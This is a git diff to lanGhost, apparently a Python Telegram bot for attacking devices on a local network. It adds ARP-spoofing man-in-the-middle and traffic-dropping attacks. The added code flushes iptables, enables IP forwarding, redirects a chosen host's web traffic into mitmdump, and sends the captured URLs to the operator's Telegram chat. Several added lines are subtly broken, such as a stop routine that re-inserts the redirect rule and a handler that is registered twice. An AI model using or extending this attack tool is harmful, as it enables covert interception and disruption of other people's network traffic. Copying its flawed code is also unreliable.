@@ -15,6 +15,7 @@ import threading
 import traceback
 import telegram
 import requests
+import sqlite3
 import time
 import nmap
 import json
@@ -47,6 +48,31 @@ def refreshNetworkInfo():
                 gw_mac = scan["scan"][gw_ip]["addresses"]["mac"]
     if not gw_mac:
         print("[!] Cant get gateway MAC...")
+
+def iptables(action, target=False):
+    if action == "setup":
+        print("[+] Running iptables setup...")
+        os.system("sudo iptables --flush")
+        os.system("sudo iptables --table nat --flush")
+        os.system("sudo iptables --delete-chain")
+        os.system("sudo iptables --table nat --delete-chain")
+        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
+
+    if action == "kill":
+        print("[+] Dropping connections from " + target + " with iptables...")
+        os.system("iptables -I FORWARD -s " + target + " -j DROP")
+
+    if action == "stopkill":
+        print("[+] Stopping iptables kill for " + target)
+        os.system("iptables -D FORWARD -s " + target + " -j DROP")
+
+    if action == "mitm":
+        print("[+] Routing " + target + " into mitmdump with iptables")
+        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+
+    if action == "stopmitm":
+        print("[+] Stopping iptables mitm for " + target)
+        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
 
 def scan():
     refreshNetworkInfo()
@@ -85,7 +111,7 @@ def subscriptionHandler(bot):
 
     def handleScan(scan):
         for t_host in temp_disconnected:
-            if t_host[1] >= 10:
+            if t_host[1] >= 20:
                 print("[D] Removed " + str(t_host) + " from temp_disconnected, its over 5")
                 disconnected.append(t_host[0])
                 temp_disconnected.remove(t_host)
@@ -144,7 +170,7 @@ def subscriptionHandler(bot):
 
         time.sleep(20)
 
-def arpSpoof(target, ID):
+def arpSpoof(target, ID, atype):
     global iface_mac
     global gw_ip
     global gw_mac
@@ -153,8 +179,49 @@ def arpSpoof(target, ID):
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
             time.sleep(1)
         else:
+            if atype == "kill":
+                iptables("stopkill", target=target[0])
+            elif atype == "mitm":
+                iptables("stopmitm", target=target[0])
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
             break
+
+def mitmHandler(target, ID, bot):
+    global admin_chatid
+
+    script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
+    print("[+][mitmHandler][ID:" + str(ID) + "] Starting mitmdump in screen session...")
+    os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -m -d mitmdump -T -s " + script_path)
+
+    while True:
+        if attackManager("isrunning", ID=ID) == True:
+            try:
+                script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
+                DBconn = sqlite3.connect(script_path + "lanGhost.db")
+                DBcursor = DBconn.cursor()
+                DBcursor.execute("SELECT * FROM lanGhost_mitm")
+                data = DBcursor.fetchall()
+                DBconn.close()
+
+                DBconn = sqlite3.connect(script_path + "lanGhost.db")
+                DBcursor = DBconn.cursor()
+                textline = "📱 MITM - " + target[0] + "\n\n"
+                for item in data:
+                    if len(textline) > 3000:
+                        break
+                    else:
+                        textline += item[3] + "\n\n"
+                    DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
+                    DBconn.commit()
+                bot.send_message(chat_id=admin_chatid, text=textline)
+                DBconn.close()
+                time.sleep(1)
+            except:
+                pass
+        else:
+            print("[+][mitmHandler][ID:" + str(ID) + "] Stopping mitmdump...")
+            os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -X stuff '^C\n'")
+
 
 def attackManager(action, attack_type=False, target=False, ID=False):
     global running_attacks
@@ -188,7 +255,7 @@ def attackManager(action, attack_type=False, target=False, ID=False):
 
     elif action == "isattacked":
         for attack in running_attacks:
-            if attack[1] == attack_type and attack[2] == target:
+            if attack[2] == target:
                 return True
         return False
 
@@ -241,11 +308,12 @@ def msg_kill(bot, update, args):
 
     target_ip = args[0]
 
-    if attackManager("isattacked", attack_type="kill", target=target_ip):
+    if attackManager("isattacked", target=target_ip):
         bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
         return
 
-    hosts = scan()
+    global latest_scan
+    hosts = latest_scan[:]
     target_mac = False
     for host in hosts:
         if host[0] == target_ip:
@@ -254,10 +322,11 @@ def msg_kill(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
         return
 
-    ID = attackManager("new", attack_type="kill", target=target_ip)
+    ID = attackManager("new", attack_type="mitm", target=target_ip)
 
     target = [target_ip, target_mac]
-    kill_thread = threading.Thread(target=arpSpoof, args=[target, ID])
+    iptables("kill", target=target[0])
+    kill_thread = threading.Thread(target=arpSpoof, args=[target, ID, "kill"])
     kill_thread.daemon = True
     kill_thread.start()
 
@@ -302,6 +371,44 @@ def msg_attacks(bot, update, args):
         textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
     bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)
 
+def msg_mitm(bot, update, args):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+
+    if args == []:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /mitm [IP]")
+        return
+
+    target_ip = args[0]
+
+    if attackManager("isattacked", target=target_ip):
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
+        return
+
+    global latest_scan
+    hosts = latest_scan[:]
+    target_mac = False
+    for host in hosts:
+        if host[0] == target_ip:
+            target_mac = host[1]
+    if not target_mac:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+        return
+
+    ID = attackManager("new", attack_type="mitm", target=target_ip)
+
+    target = [target_ip, target_mac]
+    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "mitm"])
+    arp_thread.daemon = True
+    arp_thread.start()
+    mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID, bot])
+    mitm_thread.daemon = True
+    mitm_thread.start()
+
+    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+    bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's from " + target_ip + "...")
 def main():
     global admin_chatid
 
@@ -326,6 +433,8 @@ def main():
     stop_handler = CommandHandler('stop', msg_stop, pass_args=True)
     dispatcher.add_handler(stop_handler)
     attacks_handler = CommandHandler('attacks', msg_attacks, pass_args=True)
+    dispatcher.add_handler(attacks_handler)
+    mitm_handler = CommandHandler('mitm', msg_mitm, pass_args=True)
     dispatcher.add_handler(attacks_handler)
 
     print("[+] Telegram bot started...")
@@ -377,6 +486,7 @@ if __name__ == '__main__':
         print(header + """                         v1.0 """ + WHITE + """by @xdavidhu    """ + "\n" + END)
 
     refreshNetworkInfo()
+    iptables("setup")
 
     running_attacks = []
     latest_scan = []
